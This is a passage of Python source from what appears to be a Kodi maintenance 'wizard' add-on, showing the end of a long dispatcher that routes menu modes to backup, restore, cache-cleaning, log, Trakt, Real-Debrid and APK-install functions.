elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5631
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5632
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5633
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5634
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5635
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5636
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5637
elif mode =='currentsettings':viewAdvanced ()#line:5638
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5639
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5640
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5641
elif mode =='fixskin':backtokodi ()#line:5642
elif mode =='testcommand':testcommand ()#line:5643
elif mode =='logsend':logsend ()#line:5644
elif mode =='rdon':rdon ()#line:5645
elif mode =='rdoff':rdoff ()#line:5646
elif mode =='setrd':setrealdebrid ()#line:5647
elif mode =='setrd2':setautorealdebrid ()#line:5648
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5649
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5650
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5651
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5652
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5653
elif mode =='freshstart':freshStart ()#line:5654
elif mode =='forceupdate':wiz .forceUpdate ()#line:5655
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5656
elif mode =='forceclose':wiz .killxbmc ()#line:5657
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5658
elif mode =='hidepassword':wiz .hidePassword ()#line:5659
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5660
elif mode =='enableaddons':enableAddons ()#line:5661
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5662
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5663
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5664
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5665
elif mode =='uploadlog':uploadLog .Main ()#line:5666
elif mode =='viewlog':LogViewer ()#line:5667
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5668
elif mode =='viewerrorlog':errorChecking (all =True )#line:5669
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5670
elif mode =='purgedb':purgeDb ()#line:5671
elif mode =='fixaddonupdate':fixUpdate ()#line:5672
elif mode =='removeaddons':removeAddonMenu ()#line:5673
elif mode =='removeaddon':removeAddon (name )#line:5674
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5675
elif mode =='removedata':removeAddonData (name )#line:5676
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5677
elif mode =='systeminfo':systemInfo ()#line:5678
elif mode =='restorezip':restoreit ('build')#line:5679
elif mode =='restoregui':restoreit ('gui')#line:5680
elif mode =='restoreaddon':restoreit ('addondata')#line:5681
elif mode =='restoreextzip':restoreextit ('build')#line:5682
elif mode =='restoreextgui':restoreextit ('gui')#line:5683
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5684
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5685
elif mode =='traktsync':traktsync ()#line:5686
elif mode =='apk':apkMenu (name )#line:5688
elif mode =='apkscrape':apkScraper (name )#line:5689
elif mode =='apkinstall':apkInstaller (name ,url )#line:5690
elif mode =='speed':speedMenu ()#line:5691
elif mode =='net':net_tools ()#line:5692
elif mode =='GetList':GetList (url )#line:5693
elif mode =='youtube':youtubeMenu (name )#line:5694
elif mode =='viewVideo':playVideo (url )#line:5695
elif mode =='addons':addonMenu (name )#line:5697
elif mode =='addoninstall':addonInstaller (name ,url )#line:5698
elif mode =='savedata':saveMenu ()#line:5700
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5701
elif mode =='managedata':manageSaveData (name )#line:5702
elif mode =='whitelist':wiz .whiteList (name )#line:5703
elif mode =='trakt':traktMenu ()#line:5705
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5706
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5707
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5708
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5709
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5710
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5711
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5712
elif mode =='realdebrid':realMenu ()#line:5714
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5715
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5716
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5717
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5718
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5719
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5720
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5721
elif mode =='login':loginMenu ()#line:5723
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5724
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5725
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5726
elif mode =='clearlogin':loginit .clearSaved (name )#line:5727
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5728
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5729
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5730
elif mode =='contact':notify .contact (CONTACT )#line:5732
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5733
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5734
elif mode =='developer':developer ()#line:5736
elif mode =='converttext':wiz .convertText ()#line:5737
elif mode =='createqr':wiz .createQR ()#line:5738
elif mode =='testnotify':testnotify ()#line:5739
elif mode =='testnotify2':testnotify2 ()#line:5740
elif mode =='servicemanual':servicemanual ()#line:5741
elif mode =='fastinstall':fastinstall ()#line:5742
elif mode =='testupdate':testupdate ()#line:5743
elif mode =='testfirst':testfirst ()#line:5744
elif mode =='testfirstrun':testfirstRun ()#line:5745
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5746
elif mode =='bg':wiz .bg_install (name ,url )#line:5748
elif mode =='bgcustom':wiz .bg_custom ()#line:5749
elif mode =='bgremove':wiz .bg_remove ()#line:5750
elif mode =='bgdefault':wiz .bg_default ()#line:5751
elif mode =='rdset':rdsetup ()#line:5752
elif mode =='mor':morsetup ()#line:5753
elif mode =='mor2':morsetup2 ()#line:5754
elif mode =='resolveurl':resolveurlsetup ()#line:5755
elif mode =='urlresolver':urlresolversetup ()#line:5756
elif mode =='forcefastupdate':forcefastupdate ()#line:5757
elif mode =='traktset':traktsetup ()#line:5758
elif mode =='placentaset':placentasetup ()#line:5759
elif mode =='flixnetset':flixnetsetup ()#line:5760
elif mode =='reptiliaset':reptiliasetup ()#line:5761
elif mode =='yodasset':yodasetup ()#line:5762
elif mode =='numbersset':numberssetup ()#line:5763
elif mode =='uranusset':uranussetup ()#line:5764
elif mode =='genesisset':genesissetup ()#line:5765
elif mode =='fastupdate':fastupdate ()#line:5766
elif mode =='folderback':folderback ()#line:5767
elif mode =='menudata':Menu ()#line:5768
elif mode ==2 :#line:5770
        wiz .torent_menu ()#line:5771
elif mode ==3 :#line:5772
        wiz .popcorn_menu ()#line:5773
elif mode ==8 :#line:5774
        wiz .metaliq_fix ()#line:5775
elif mode ==9 :#line:5776
        wiz .quasar_menu ()#line:5777
elif mode ==5 :#line:5778
        swapSkins ('skin.Premium.mod')#line:5779
elif mode ==13 :#line:5780
        wiz .elementum_menu ()#line:5781
elif mode ==16 :#line:5782
        wiz .fix_wizard ()#line:5783
elif mode ==17 :#line:5784
        wiz .last_play ()#line:5785
elif mode ==18 :#line:5786
        wiz .normal_metalliq ()#line:5787
elif mode ==19 :#line:5788
        wiz .fast_metalliq ()#line:5789
elif mode ==20 :#line:5790
        wiz .fix_buffer2 ()#line:5791
elif mode ==21 :#line:5792
        wiz .fix_buffer3 ()#line:5793
elif mode ==11 :#line:5794
        wiz .fix_buffer ()#line:5795
elif mode ==15 :#line:5796
        wiz .fix_font ()#line:5797
elif mode ==14 :#line:5798
        wiz .clean_pass ()#line:5799
elif mode ==22 :#line:5800
        wiz .movie_update ()#line:5801
elif mode =='adv_settings':buffer1 ()#line:5802
elif mode =='getpass':getpass ()#line:5803
elif mode =='setpass':setpass ()#line:5804
elif mode =='setuname':setuname ()#line:5805
elif mode =='passandUsername':passandUsername ()#line:5806
elif mode =='9':disply_hwr ()#line:5807
elif mode =='99':disply_hwr2 ()#line:5808
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))